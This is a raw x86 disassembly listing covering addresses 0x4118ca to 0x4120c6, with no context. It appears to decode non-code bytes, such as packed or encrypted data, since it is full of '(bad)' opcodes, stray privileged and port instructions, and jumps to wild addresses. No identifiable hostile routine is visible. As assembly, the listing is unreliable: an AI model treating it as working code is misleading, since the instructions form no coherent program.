  4118ca:	xor    ecx,ebx
  4118cc:	rcl    BYTE PTR [ebp+0x33d58809],1
  4118d2:	add    BYTE PTR [esi-0x69cc0703],bl
  4118d8:	std    
  4118d9:	lock fwait
  4118db:	std    
  4118dc:	pop    esi
  4118dd:	mov    ebp,0x1b758e92
  4118e2:	xchg   ebx,eax
  4118e3:	jg     0x411936
  4118e5:	stos   BYTE PTR es:[edi],al
  4118e6:	push   DWORD PTR [esi-0x24]
  4118e9:	jno    0x41188a
  4118eb:	mov    bl,0x4c
  4118ed:	mov    al,ds:0x308db3a
  4118f2:	into   
  4118f3:	pop    edi
  4118f4:	std    
  4118f5:	loopne 0x411892
  4118f7:	and    al,0xdc
  4118f9:	test   DWORD PTR [edx+0x7e7ccdb9],edx
  4118ff:	add    eax,0x31452143
  411904:	mov    DWORD PTR [ebp-0x2f1e42fd],ebp
  41190a:	mov    ecx,0x3ae8c895
  41190f:	sbb    DWORD PTR [ecx],edi
  411911:	stos   DWORD PTR es:[edi],eax
  411912:	add    esi,DWORD PTR [ecx]
  411914:	adc    ch,BYTE PTR [ecx]
  411916:	pop    ss
  411917:	push   ebp
  411918:	ficom  WORD PTR [eax-0x78]
  41191b:	outs   dx,DWORD PTR ds:[esi]
  41191c:	xchg   BYTE PTR ds:0xfffdc6fe,bh
  411922:	cli    
  411923:	jge    0x4118f2
  411925:	imul   DWORD PTR [esi]
  411927:	sbb    DWORD PTR [ecx-0x23dfc97],eax
  41192d:	pop    es
  41192e:	adc    DWORD PTR [eax-0x3ce90179],edi
  411934:	std    
  411935:	test   DWORD PTR [ebx+0x7487c600],0xff01aaf1
  41193f:	(bad)  
  411940:	mov    al,ds:0x1df17487
  411945:	sub    bh,bh
  411947:	je     0x411903
  411949:	outs   dx,BYTE PTR ds:[esi]
  41194a:	imul   esp,esi,0xffffffc0
  41194d:	xchg   esi,edi
  41194f:	push   esp
  411950:	mov    ch,0x6e
  411952:	jl     0x411990
  411954:	rol    BYTE PTR [edi-0x3e92e505],0xfe
  41195b:	(bad)  
  41195c:	mov    al,ds:0x758ff187
  411961:	pcmpeqw mm1,QWORD PTR [esi-0x51040260]
  411968:	push   ds
  411969:	adc    eax,ebp
  41196b:	mov    esp,DWORD PTR [edi]
  41196d:	xchg   dh,bh
  41196f:	ds stos BYTE PTR es:[edi],al
  411971:	dec    eax
  411972:	add    ebp,ecx
  411974:	daa    
  411975:	xchg   edx,eax
  411976:	jmp    0x4119e2
  411978:	imul   eax,DWORD PTR [edx-0xccaecaa],0x111e7e3a
  411982:	call   0xfec720f4
  411987:	pusha  
  411988:	out    dx,al
  411989:	test   BYTE PTR [edx+0x40cdff24],cl
  41198f:	jmp    0xdd416046
  411994:	jb     0x411987
  411996:	in     eax,0xc4
  411998:	jae    0x4119a3
  41199a:	push   edi
  41199b:	add    BYTE PTR [eax],al
  41199d:	pusha  
  41199e:	lock aas 
  4119a0:	add    BYTE PTR [eax],bl
  4119a2:	test   DWORD PTR [esi-0x17bfd48c],edi
  4119a8:	sti    
  4119a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119aa:	cwde   
  4119ab:	std    
  4119ac:	or     ebx,DWORD PTR [eax]
  4119ae:	and    DWORD PTR [ecx],ebx
  4119b0:	push   eax
  4119b1:	ror    BYTE PTR [ecx],0x0
  4119b4:	out    dx,eax
  4119b5:	xchg   BYTE PTR ds:0x98965f0,ah
  4119bb:	push   eax
  4119bc:	dec    DWORD PTR [ebp-0x7e]
  4119bf:	out    0x3,al
  4119c1:	inc    esi
  4119c2:	cdq    
  4119c3:	std    
  4119c4:	call   0x40589d
  4119c9:	les    ebx,FWORD PTR [esi+edi*4-0x47]
  4119cd:	xchg   edi,eax
  4119ce:	cwde   
  4119cf:	std    
  4119d0:	dec    DWORD PTR [edx-0x2f8c919]
  4119d6:	dec    esp
  4119d7:	std    
  4119d8:	jne    0x411a3e
  4119da:	cwde   
  4119db:	jae    0x4119e5
  4119dd:	pusha  
  4119de:	sbb    dl,BYTE PTR [edx-0x1]
  4119e1:	(bad)  
  4119e2:	cmp    cl,cl
  4119e4:	ret    0x98c
  4119e7:	push   ebp
  4119e8:	mov    esi,DWORD PTR [esp+ecx*4+0x56dbe8c2]
  4119ef:	inc    esi
  4119f0:	dec    ebx
  4119f1:	sbb    DWORD PTR ds:0xc24c7500,ecx
  4119f7:	ror    BYTE PTR [eax+ecx*2],0x23
  4119fb:	add    BYTE PTR [edx+0x58],ch
  4119fe:	and    edi,edi
  411a00:	inc    DWORD PTR [eax]
  411a02:	cmp    eax,0x32006885
  411a07:	or     eax,0xd0895e8
  411a0c:	add    BYTE PTR [ecx+0x75fd90dd],cl
  411a12:	nop
  411a13:	mov    al,ds:0xdb3154d3
  411a18:	(bad)
  411a1c:	(bad)  
  411a1d:	je     0x411a28
  411a1f:	int3   
  411a20:	adc    eax,0x90439bfc
  411a25:	je     0x411a54
  411a27:	dec    eax
  411a28:	add    ch,BYTE PTR [edx+0x31]
  411a2b:	retf   0x4013
  411a2e:	xor    DWORD PTR [edx+0x7d],esi
  411a31:	inc    esp
  411a32:	ffree  st(2)
  411a34:	sbb    al,0x0
  411a36:	dec    ebx
  411a37:	jb     0x411a55
  411a39:	adc    cl,BYTE PTR [ebx+0x72]
  411a3c:	(bad)  
  411a3d:	je     0x411a0c
  411a3f:	or     esi,esi
  411a41:	inc    edi
  411a42:	jp     0x4119f5
  411a44:	add    al,BYTE PTR [ebp-0x7885940f]
  411a4a:	xor    DWORD PTR [edx+0x2],esi
  411a4d:	mov    eax,DWORD PTR [esi+eiz*2]
  411a50:	jp     0x411a63
  411a52:	mov    ah,0x2d
  411a54:	xchg   esp,eax
  411a55:	dec    edi
  411a56:	or     esi,DWORD PTR [edx+0x18]
  411a59:	adc    cl,BYTE PTR [ebx]
  411a5b:	jb     0x411a77
  411a5d:	adc    eax,0xff043117
  411a62:	cld    
  411a63:	mov    ebp,0x2100518e
  411a68:	cmc    
  411a69:	ret    
  411a6a:	ja     0x411a42
  411a6c:	mov    dl,0x18
  411a6e:	lock pop ecx
  411a70:	xor    al,BYTE PTR [eax-0x1]
  411a73:	data16 stc 
  411a75:	dec    eax
  411a76:	call   0x4858cca5
  411a7b:	push   esi
  411a7c:	sbb    eax,0x25dde79c
  411a81:	(bad)  
  411a82:	(bad)  
  411a83:	mov    eax,0xc4fea02d
  411a88:	add    DWORD PTR [edx+edx*2-0x1710d19],ebx
  411a8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a90:	or     DWORD PTR [ecx-0x71],edx
  411a93:	popf   
  411a94:	jne    0x411af3
  411a96:	sbb    DWORD PTR [ecx],esp
  411a98:	jno    0x411ac5
  411a9a:	inc    eax
  411a9b:	push   ss
  411a9c:	test   cl,ah
  411a9e:	ret    
  411a9f:	and    BYTE PTR [eax],0xd1
  411aa2:	add    esi,DWORD PTR [ecx]
  411aa4:	je     0x411b24
  411aa6:	pop    DWORD PTR [ebp+0x66b04111]
  411aac:	test   BYTE PTR ds:0x2571658f,ch
  411ab2:	sbb    ebp,edx
  411ab4:	adc    DWORD PTR [ebx-0x47f32905],0xffffff8e
  411abb:	xlat   BYTE PTR ds:[ebx]
  411abc:	adc    DWORD PTR [ebx-0x62e22961],0xffffff8e
  411ac3:	mov    DWORD PTR [ebx-0x6b296c8d],0xb7008ea1
  411acd:	(bad)  
  411ace:	xchg   ebx,eax
  411acf:	xchg   edi,eax
  411ad0:	mov    ebx,0x9d18e616
  411ad5:	cmp    DWORD PTR [edx],0xfffffffc
  411ad8:	lahf   
  411ad9:	std    
  411ada:	aam    0x9b
  411adc:	cwde   
  411add:	xlat   BYTE PTR ds:[ebx]
  411ade:	int    0x8e
  411ae0:	jns    0x411b28
  411ae2:	hlt    
  411ae3:	add    ebx,esp
  411ae5:	(bad)  
  411ae6:	int3   
  411ae7:	mov    es,WORD PTR ds:0xd942c115
  411aed:	sub    DWORD PTR [ebp-0x30035106],0x1b
  411af4:	imul   ebp,ebp,0x27
  411af7:	add    al,0x1
  411af9:	jno    0x411aa0
  411afb:	ss push esi
  411afd:	cmp    DWORD PTR [eax],0x1c
  411b00:	add    DWORD PTR [edi+0x28],0x4
  411b04:	(bad)  [eax]
  411b06:	jmp    0x3197a9
  411b0b:	fmul   DWORD PTR [edx+ecx*8]
  411b0e:	call   FWORD PTR [eax]
  411b10:	mov    esi,0x285107fd
  411b15:	add    bh,bh
  411b17:	pop    esi
  411b18:	mov    edx,0xa75652c4
  411b1d:	xor    DWORD PTR [ebp+ebx*8-0x56],0x14
  411b22:	pop    eax
  411b23:	inc    esi
  411b24:	mov    bh,0xf
  411b26:	shl    BYTE PTR [ebp-0x30ff1523],0x6d
  411b2d:	or     DWORD PTR [eax+0x41],edx
  411b30:	add    BYTE PTR [eax-0x25],bl
  411b33:	(bad)  
  411b34:	es and dh,cl
  411b37:	mov    cl,0x2a
  411b39:	jb     0x411b44
  411b3b:	push   0xbd7232e9
  411b40:	add    edx,0x2e940ec
  411b46:	xor    BYTE PTR [ecx+esi*8-0x66],0x5d
  411b4b:	jns    0x411b43
  411b4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b4e:	push   0xffffff88
  411b50:	call   0x82a5:0xabc883bf
  411b57:	push   ebx
  411b58:	jb     0x411b2b
  411b5a:	xchg   ebx,eax
  411b5c:	aad    0x3b
  411b5e:	or     DWORD PTR [edx+0xd],ebp
  411b61:	mov    esp,0xe8d107fd
  411b66:	sar    esi,1
  411b68:	mov    esi,0x43fbccfa
  411b6d:	mov    eax,DWORD PTR [ebx-0xd351e8c]
  411b73:	(bad)  
  411b74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b75:	mov    ah,0xf0
  411b77:	and    bl,BYTE PTR [esi+0xfe81146]
  411b7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b7e:	cmp    esi,0x3
  411b81:	inc    ecx
  411b82:	xor    DWORD PTR [eax+eax*1+0x40],0xffffff9e
  411b87:	pop    edx
  411b88:	(bad)  
  411b89:	mov    edi,0xbc75fd93
  411b8e:	xchg   ebx,eax
  411b8f:	jae    0x411b99
  411b91:	mov    al,0x49
  411b93:	dec    esi
  411b94:	inc    DWORD PTR [eax]
  411b96:	(bad)  
  411b97:	mov    esi,0x3b0804c0
  411b9c:	mov    ebp,esp
  411b9e:	jg     0x411bba
  411ba0:	or     al,0xe8
  411ba2:	mov    BYTE PTR [edi+edi*8],bh
  411ba5:	inc    DWORD PTR [ebx]
  411ba7:	inc    esi
  411ba8:	jb     0x411bce
  411baa:	loopne 0x411c18
  411bac:	fs inc ecx
  411bae:	or     BYTE PTR [esi],dh
  411bb0:	call   0xfdd5e2d1
  411bb5:	push   eax
  411bb6:	rol    BYTE PTR ds:0x257eef00,0x3a
  411bbd:	mov    WORD PTR ds:0x7da5ff50,ax
  411bc4:	out    0x7,al
  411bc6:	lods   al,BYTE PTR ds:[esi]
  411bc7:	xchg   esp,eax
  411bc8:	std    
  411bc9:	call   0x4054a6
  411bce:	adc    DWORD PTR [edi+0x6],eax
  411bd1:	add    ch,al
  411bd3:	add    bl,ch
  411bd5:	adc    esp,0xffffff91
  411bd8:	push   0xfd520200
  411bdd:	jne    0x411b6f
  411bdf:	popf   
  411be0:	xor    BYTE PTR [eax+0x7f],dl
  411be3:	xchg   esp,eax
  411be4:	xchg   DWORD PTR [ebp+0x6c],eax
  411be7:	pop    ds
  411be8:	sbb    bh,bh
  411bea:	inc    ebp
  411beb:	test   esi,esp
  411bed:	stos   BYTE PTR es:[edi],al
  411bee:	mov    edi,0x3b6afd94
  411bf3:	xchg   esp,eax
  411bf4:	jae    0x411bfe
  411bf6:	shl    ch,0xfd
  411bf9:	inc    DWORD PTR [eax]
  411bfb:	mov    edi,0x31ff1c1f
  411c00:	and    eax,0x92a7e7fc
  411c05:	mov    edi,esi
  411c07:	inc    esi
  411c08:	test   BYTE PTR [esi-0x65883b02],cl
  411c0e:	dec    ebx
  411c0f:	loope  0x411c0b
  411c11:	mov    ecx,eax
  411c13:	repz data16 add dl,BYTE PTR [ebp-0x46]
  411c18:	(bad)  
  411c19:	jg     0x411bde
  411c1b:	sbb    DWORD PTR [eax+0x188b0018],edi
  411c21:	lea    esi,[ecx+edi*1-0x36]
  411c25:	fwait
  411c26:	dec    esi
  411c27:	push   es
  411c28:	enter  0x4479,0xfd
  411c2c:	sti    
  411c2d:	int    0x39
  411c2f:	imul   esi,DWORD PTR [ecx+0x722e8002],0xb4594716
  411c39:	and    al,0x41
  411c3b:	xor    DWORD PTR [edi+0x7216119a],esi
  411c41:	add    cl,BYTE PTR [ebx]
  411c43:	icebp  
  411c44:	xchg   esi,eax
  411c45:	fcom   DWORD PTR [esi-0x27]
  411c48:	nop
  411c49:	cs (bad) 
  411c4b:	mov    esi,0x1173c27b
  411c50:	jmp    0x725b149a
  411c55:	add    ch,bh
  411c57:	out    0xda,eax
  411c59:	ds data16 lock jno 0x411be7
  411c5e:	je     0x411c60
  411c60:	cdq    
  411c61:	push   edi
  411c62:	adc    BYTE PTR [eax],cl
  411c64:	cdq    
  411c65:	int3   
  411c66:	push   cs
  411c67:	inc    DWORD PTR [esi-0x7607efb9]
  411c6d:	inc    edx
  411c6e:	push   DWORD PTR ss:[esi-0x4a]
  411c72:	(bad)  
  411c73:	mov    edi,0xfe8aafa8
  411c78:	or     WORD PTR [ebx+0x1408265a],bx
  411c7f:	dec    ebp
  411c80:	push   edi
  411c81:	not    BYTE PTR [ebx+ecx*4-0x4e7eef3b]
  411c88:	idiv   DWORD PTR [edi-0x7b]
  411c8b:	sub    ebp,DWORD PTR [eax+0x4b]
  411c8e:	in     al,0x3
  411c90:	fcom   QWORD PTR [ebx+0x64f28784]
  411c96:	adc    eax,0x25f3311e
  411c9b:	mov    esp,DWORD PTR [ebp+0x66135111]
  411ca1:	adc    BYTE PTR [ebp+0x7d],0x75
  411ca5:	jge    0x411d08
  411ca7:	leave  
  411ca8:	dec    eax
  411ca9:	shl    DWORD PTR [edi-0x16c04efd],1
  411caf:	movd   mm6,ecx
  411cb2:	cwde   
  411cb3:	and    DWORD PTR [eax+0x9],esi
  411cb6:	xchg   esi,eax
  411cb7:	fwait
  411cb8:	enter  0xe93e,0x3
  411cbc:	sub    cl,BYTE PTR [ecx-0x6c]
  411cbf:	fnstsw WORD PTR [edi+0x71]
  411cc2:	push   es
  411cc3:	das    
  411cc4:	add    dh,cl
  411cc6:	jg     0x411ca9
  411cc8:	ret    
  411cc9:	inc    edx
  411cca:	sub    DWORD PTR [eax+0x41],esi
  411ccd:	mov    ecx,0xc603e8f0
  411cd2:	mov    esi,0xca172c80
  411cd7:	call   0xe5c23a66
  411cdc:	adc    BYTE PTR [ecx],ch
  411cde:	jno    0x411cba
  411ce0:	or     eax,0x10d57f96
  411ce5:	mov    DWORD PTR [eax-0x30],esi
  411ce8:	xor    al,0x86
  411cea:	jg     0x411cb0
  411cec:	(bad)  
  411ced:	mov    esi,0x778abdc1
  411cf2:	jg     0x411cf3
  411cf4:	mov    edx,0x34073808
  411cf9:	hlt    
  411cfa:	out    0xff,eax
  411cfc:	call   0x40a8dabc
  411d01:	adc    ecx,edx
  411d03:	inc    DWORD PTR [eax]
  411d05:	out    0xe5,eax
  411d07:	inc    eax
  411d08:	jmp    0x914911c8
  411d0d:	inc    edx
  411d0e:	add    bh,bh
  411d10:	jle    0x411d26
  411d12:	or     DWORD PTR [eax+0xb],ebp
  411d15:	push   ebx
  411d16:	enter  0xff,0xa8
  411d1a:	in     al,0x40
  411d1c:	jmp    0xb1f752cc
  411d21:	ins    DWORD PTR es:[edi],dx
  411d22:	or     eax,ebp
  411d24:	cmp    eax,0x60fe7e5e
  411d29:	add    BYTE PTR [ecx+0x6d],dh
  411d2c:	imul   ebp,ecx,0xa865ee1a
  411d32:	xor    dh,cl
  411d34:	mov    edi,cs
  411d36:	jne    0x411d41
  411d38:	push   esp
  411d3a:	add    dh,0x40
  411d3d:	jmp    0x1e94ddfc
  411d42:	stos   DWORD PTR es:[edi],eax
  411d43:	xchg   ecx,eax
  411d44:	inc    esp
  411d45:	sbb    eax,0x9268092c
  411d4a:	adc    al,cl
  411d4c:	call   DWORD PTR [eax-0x16bf1bc7]
  411d52:	stos   DWORD PTR es:[edi],eax
  411d53:	xor    eax,0x8f5a1b6
  411d58:	call   0xfebf73a6
  411d5d:	jo     0x411dbd
  411d5f:	jns    0x411ced
  411d61:	and    al,0xd1
  411d63:	into   
  411d64:	ins    DWORD PTR es:[di],dx
  411d66:	push   ebx
  411d67:	enter  0x40ff,0xfe
  411d6b:	jecxz  0x411dad
  411d6d:	add    BYTE PTR [eax+0x40b63391],cl
  411d73:	retf   0xe7ff
  411d76:	fdivr  QWORD PTR [eax]
  411d78:	(bad)  
  411d79:	call   ecx
  411d7b:	cmp    eax,0x991583e8
  411d80:	(bad)  
  411d81:	jae    0x411da3
  411d83:	test   BYTE PTR [ebx-0x10],bh
  411d86:	pop    eax
  411d87:	push   cs
  411d88:	inc    edx
  411d89:	xor    DWORD PTR ds:0x73fea1,0x74
  411d90:	and    al,BYTE PTR [ecx]
  411d92:	add    BYTE PTR [edi+0x1075fdd3],ah
  411d98:	mov    ds:0x90974df9,al
  411d9d:	std    
  411d9e:	jne    0x411e1c
  411da0:	nop
  411da1:	jae    0x411dab
  411da3:	xor    BYTE PTR [edi],0x4e
  411da6:	jmp    DWORD PTR [edi-0x70]
  411da9:	jae    0x411d9b
  411dab:	ja     0x411dbb
  411dad:	or     al,ch
  411daf:	iret   
  411db0:	aas    
  411db1:	(bad)  
  411db2:	push   DWORD PTR [edi]
  411db4:	push   cs
  411db5:	in     al,dx
  411db6:	jmp    FWORD PTR [ebp-0x39c3197f]
  411dbc:	nop
  411dbd:	std    
  411dbe:	(bad)  
  411dbf:	mov    ebp,0x4075fd9d
  411dc4:	nop
  411dc5:	jae    0x411dcf
  411dc7:	xor    BYTE PTR [edi],al
  411dc9:	dec    esi
  411dca:	push   DWORD PTR [edi]
  411dcc:	nop
  411dcd:	jae    0x411dbb
  411dcf:	and    BYTE PTR [edi+ecx*2-0x1],dh
  411dd3:	mov    bh,0x90
  411dd5:	jae    0x411dcb
  411dd7:	xor    BYTE PTR [edi+ecx*2-0x1],bh
  411ddb:	xchg   edi,eax
  411ddc:	nop
  411ddd:	jae    0x411dcf
  411ddf:	add    BYTE PTR [ecx+edx*2],0xff
  411de3:	ja     0x411d75
  411de5:	jae    0x411dcf
  411de7:	xor    DWORD PTR [eax-0x75],ecx
  411dea:	dec    edi
  411deb:	xchg   BYTE PTR [esi-0x79],cl
  411dee:	je     0x411e6d
  411df0:	inc    esi
  411df1:	or     eax,0xcd890008
  411df6:	cmp    edi,edi
  411df8:	outs   dx,BYTE PTR ds:[esi]
  411df9:	push   ss
  411dfa:	mov    ebx,0x2d702dc1
  411dff:	mov    ecx,DWORD PTR [ebp-0xe]
  411e02:	mov    esi,0x1c6fcbfb
  411e07:	inc    eax
  411e08:	dec    esi
  411e09:	sbb    al,0xfc
  411e0b:	out    0x20,eax
  411e0d:	push   ds
  411e0e:	mov    esi,edi
  411e10:	test   al,0x2c
  411e12:	mov    BYTE PTR [ecx+0x31],ch
  411e15:	sbb    al,BYTE PTR [eax+ebp*2]
  411e18:	lock or al,0x43
  411e1b:	add    BYTE PTR [ecx-0x4efffd8e],bl
  411e21:	fisubr DWORD PTR [ebx-0x423e9ae]
  411e27:	mov    edi,0xe8340f85
  411e2c:	mov    edx,0x2afe87b8
  411e31:	xor    cl,BYTE PTR [edi]
  411e33:	sbb    DWORD PTR [ecx+0x5a],esp
  411e36:	add    al,BYTE PTR [eax]
  411e38:	fdivrp st(4),st
  411e3a:	sbb    bh,BYTE PTR [edi+ecx*2-0x21affd4f]
  411e41:	popf   
  411e42:	cli    
  411e43:	out    0xc2,eax
  411e45:	test   eax,0xf6d9fe87
  411e4a:	xor    bh,bh
  411e4c:	(bad)  
  411e4d:	or     ecx,DWORD PTR [esi]
  411e4f:	cld    
  411e50:	mov    esi,0x26e7fafd
  411e55:	lods   al,BYTE PTR ds:[esi]
  411e56:	xchg   esi,edi
  411e58:	add    BYTE PTR [eax+0x30],bh
  411e5b:	(bad)  
  411e5c:	(bad)  
  411e5d:	std    
  411e5e:	out    0x96,al
  411e60:	xor    BYTE PTR [ebp+0x9],0xe5
  411e64:	das    
  411e65:	or     ecx,DWORD PTR [ecx]
  411e67:	push   ebx
  411e68:	inc    ebp
  411e69:	mov    ?,esi
  411e6b:	loopne 0x411e08
  411e6d:	ror    dh,0xcd
  411e70:	xchg   DWORD PTR [ecx+0x357bc4c6],ebp
  411e76:	aas    
  411e77:	xor    DWORD PTR [ebp+0x31],eax
  411e7a:	mov    ebp,esi
  411e7c:	add    ebx,ebp
  411e7e:	enter  0xa740,0xd4
  411e82:	leave  
  411e83:	call   0xdc9767b6
  411e88:	add    esi,DWORD PTR [ecx]
  411e8a:	adc    BYTE PTR [ecx-0x7f2bedf0],ch
  411e90:	fstp   st(0)
  411e92:	jnp    0x411e19
  411e94:	sti    
  411e95:	jbe    0x411e8c
  411e97:	fbstp  TBYTE PTR [ebx]
  411e99:	cdq    
  411e9a:	or     ecx,ebp
  411e9c:	xchg   esi,eax
  411e9d:	in     al,0xf0
  411e9f:	sbb    DWORD PTR [esi],0x70
  411ea2:	or     DWORD PTR [ecx+0x51119d86],edi
  411ea8:	aad    0x89
  411eaa:	jl     0x411f01
  411eac:	pushf  
  411ead:	dec    eax
  411eae:	(bad)  [ebp-0x79]
  411eb1:	cli    
  411eb2:	aaa    
  411eb3:	sub    DWORD PTR [ebp-0x9],ecx
  411eb6:	jnp    0x411ef5
  411eb8:	xchg   eax,esp
  411eba:	stos   BYTE PTR es:[edi],al
  411ebb:	lock inc BYTE PTR [eax]
  411ebe:	pop    ebp
  411ebf:	dec    ecx
  411ec0:	sub    eax,0x9b7bdd11
  411ec5:	sti    
  411ec6:	into   
  411ec7:	fwait
  411ec8:	stos   DWORD PTR es:[edi],eax
  411ec9:	xchg   bh,cl
  411ecb:	fistp  DWORD PTR [edi]
  411ecd:	ret    0x932
  411ed0:	mov    ah,0x7a
  411ed2:	retf   0x2c87
  411ed5:	mov    BYTE PTR [edi-0x11],bl
  411ed8:	call   0xffbd11f6
  411edd:	jnp    0x411e89
  411edf:	arpl   WORD PTR [eax-0x64],ax
  411ee2:	mov    bh,0x7a
  411ee4:	mov    BYTE PTR [ecx+ebp*4],ch
  411ee7:	mov    ?,WORD PTR [ebx+eiz*1]
  411eea:	dec    ebp
  411eeb:	retf   0x68ff
  411eee:	outs   dx,DWORD PTR ds:[esi]
  411eef:	jnp    0x411f63
  411ef1:	sub    DWORD PTR ds:0x2d286576,ebx
  411ef7:	aam    0xe7
  411ef9:	inc    ebp
  411efa:	jns    0x411f77
  411efc:	(bad)  
  411efd:	loop   0x411f71
  411eff:	mul    DWORD PTR [edx]
  411f01:	push   ss
  411f02:	mov    ebp,0xafa658b3
  411f07:	push   cs
  411f08:	rcl    BYTE PTR ds:0xe967cb5c,0x32
  411f0f:	ins    BYTE PTR es:[edi],dx
  411f10:	mov    ebp,0x40e5a901
  411f15:	jmp    0xf1b59b1c
  411f1a:	retf   0x77ba
  411f1d:	jbe    0x411ece
  411f1f:	(bad)  
  411f20:	enter  0x1e,0xb6
  411f24:	jnp    0x411f21
  411f26:	sbb    ch,ch
  411f28:	sar    esi,0x5e
  411f2b:	mov    bh,0x7b
  411f2d:	icebp  
  411f2e:	xchg   edx,edi
  411f30:	add    esi,DWORD PTR [ebp+0x29]
  411f33:	sbb    BYTE PTR [esi],ah
  411f35:	call   0xfebb662f
  411f3a:	repnz repnz mul BYTE PTR [ebx]
  411f3e:	shl    esp,0xe3
  411f41:	inc    eax
  411f42:	jmp    0xbad89069
  411f47:	scas   eax,DWORD PTR es:[edi]
  411f48:	jnp    0x411f99
  411f4a:	xchg   ecx,eax
  411f4b:	xor    cl,BYTE PTR [ecx]
  411f4d:	out    dx,eax
  411f4e:	push   edi
  411f4f:	sub    bh,BYTE PTR [ebp+0x65]
  411f52:	test   al,0x32
  411f54:	fsin   
  411f56:	add    BYTE PTR ds:0xb083e67e,dh
  411f5c:	cmp    ebp,0xffffffe8
  411f5f:	or     al,0x33
  411f61:	(bad)  
  411f62:	push   DWORD PTR [edx+0x5bdde667]
  411f68:	test   ch,bh
  411f6a:	or     ebx,eax
  411f6c:	sbb    DWORD PTR [eax+ebp*2],esp
  411f6f:	mov    ds,WORD PTR ds:0x9d380041
  411f75:	addr16 push ebx
  411f77:	outs   dx,DWORD PTR ds:[esi]
  411f78:	test   BYTE PTR [esi+0x68],cl
  411f7b:	pop    eax
  411f7c:	push   es
  411f7d:	out    dx,eax
  411f7e:	mov    esi,0x416490f0
  411f83:	dec    eax
  411f84:	push   DWORD PTR ss:[ebp+0x0]
  411f88:	pusha  
  411f89:	sahf   
  411f8a:	push   edx
  411f8b:	js     0x411f3c
  411f8d:	test   dh,ah
  411f8f:	pop    ebp
  411f90:	je     0x91671f93
  411f96:	std    
  411f97:	jne    0x411fd9
  411f99:	sahf   
  411f9a:	into   
  411f9b:	dec    esp
  411f9c:	scas   eax,DWORD PTR es:[edi]
  411f9d:	test   BYTE PTR [ebp-0x37],bl
  411fa0:	fimul  DWORD PTR [eax]
  411fa2:	add    BYTE PTR [ebp-0x6d],dl
  411fa5:	mov    eax,ds:0xf278c481
  411faa:	inc    ebx
  411fab:	lock enter 0x7384,0xc
  411fb0:	jo     0x411f56
  411fb2:	push   edx
  411fb3:	jmp    FWORD PTR [edi-0x80]
  411fb6:	mov    esi,0x7b88fa74
  411fbb:	cld    
  411fbc:	fimul  DWORD PTR [ebx]
  411fbe:	and    ecx,DWORD PTR [ebx-0x7e9b726b]
  411fc4:	loopne 0x412017
  411fc6:	and    BYTE PTR [ebp+0x31],dh
  411fc9:	test   BYTE PTR [ebx+0x10],dh
  411fcc:	das    
  411fcd:	or     cl,BYTE PTR [eax]
  411fcf:	call   0xff7a4505
  411fd4:	mov    esi,0xb6fc0f0a
  411fd9:	cld    
  411fda:	mov    bh,dh
  411fdc:	and    al,0x78
  411fde:	call   0xf48c:0x8372faf4
  411fe5:	jg     0x412019
  411fe7:	call   0xfec65d40
  411fec:	add    BYTE PTR [eax-0x53],bh
  411fef:	idiv   bh
  411ff1:	fucom  st(6)
  411ff3:	xchg   esi,eax
  411ff4:	xor    BYTE PTR [ebp+0x57],0x18
  411ff8:	add    BYTE PTR [ebx],cl
  411ffa:	das    
  411ffb:	test   DWORD PTR [ecx+edi*1+0x58],esi
  411fff:	fisttp DWORD PTR [ebx+0x66]
  412002:	mov    dl,0x79
  412004:	inc    esp
  412005:	pop    ebp
  412006:	lds    eax,FWORD PTR [ebx]
  412008:	push   0x31
  41200a:	sbb    al,ch
  41200c:	lock outs dx,WORD PTR ds:[esi]
  41200f:	sbb    al,BYTE PTR [edx]
  412011:	xor    DWORD PTR [eax-0x7e],esi
  412014:	out    0x40,eax
  412016:	inc    eax
  412017:	test   esi,edi
  412019:	sub    dh,BYTE PTR [eax+0x2db83f0e]
  41201f:	mov    WORD PTR [edi-0x67],fs
  412022:	pop    es
  412023:	inc    ebx
  412024:	add    BYTE PTR [esi],bl
  412026:	jle    0x411fb2
  412028:	out    0x58,eax
  41202a:	sub    eax,DWORD PTR [eax+eax*1]
  41202d:	cmp    ah,BYTE PTR [edx]
  41202f:	mov    db0,esi
  412032:	push   esi
  412033:	mov    ah,bh
  412035:	stos   BYTE PTR es:[edi],al
  412036:	mov    edx,0x5a61fe83
  41203b:	das    
  41203c:	leave  
  41203d:	jno    0x4120a1
  41203f:	sbb    al,BYTE PTR [eax]
  412041:	xor    edi,ecx
  412043:	inc    esp
  412044:	imul   esi,DWORD PTR [ecx],0x29748392
  41204a:	or     DWORD PTR [ecx],edx
  41204c:	cdq    
  41204d:	inc    ebp
  41204e:	js     0x41206d
  412050:	fwait
  412051:	add    BYTE PTR [edi+eax*8-0x1407beb],ah
  412058:	adc    BYTE PTR [ebx-0x7bfa3864],bl
  41205e:	scas   eax,DWORD PTR es:[edi]
  41205f:	(bad)  
  412060:	cld    
  412061:	sbb    DWORD PTR ds:0xeafa0101,0x77
  412068:	in     eax,dx
  412069:	mov    ecx,0xd8e90d70
  41206e:	mov    ebx,0x8a486965
  412073:	jecxz  0x41205d
  412075:	in     eax,dx
  412076:	bnd ja 0x4120cc
  412079:	or     al,0x89
  41207b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41207c:	xor    DWORD PTR [ebx-0x7fdc7d91],eax
  412082:	into   
  412083:	or     cl,ch
  412085:	jb     0x412023
  412087:	loope  0x4120ba
  412089:	jmp    0x41207c
  41208b:	or     BYTE PTR [ecx],dl
  41208d:	hlt    
  41208e:	xlat   BYTE PTR ds:[ebx]
  41208f:	leave  
  412090:	call   0x8141de17
  412095:	pushf  
  412096:	(bad)  
  412097:	ja     0x412026
  412099:	cmp    DWORD PTR [ebp+0x36f98574],0x61
  4120a0:	scas   al,BYTE PTR es:[edi]
  4120a1:	iret   
  4120a2:	daa    
  4120a3:	js     0x412044
  4120a5:	inc    esi
  4120a6:	xor    cl,BYTE PTR [ecx]
  4120a8:	adc    al,0x8f
  4120aa:	or     cl,BYTE PTR [esp+ebp*1-0x16f66984]
  4120b1:	jb     0x412077
  4120b3:	ja     0x412090
  4120b5:	or     eax,DWORD PTR [eax]
  4120b7:	or     DWORD PTR [ebx-0x5e],esp
  4120ba:	xor    bh,0x77
  4120bd:	mov    ebx,0xf0fdee0f
  4120c2:	imul   esi,DWORD PTR [ecx-0x3c],0xffffffff
  4120c6:	xor    eax,0xd97476b2
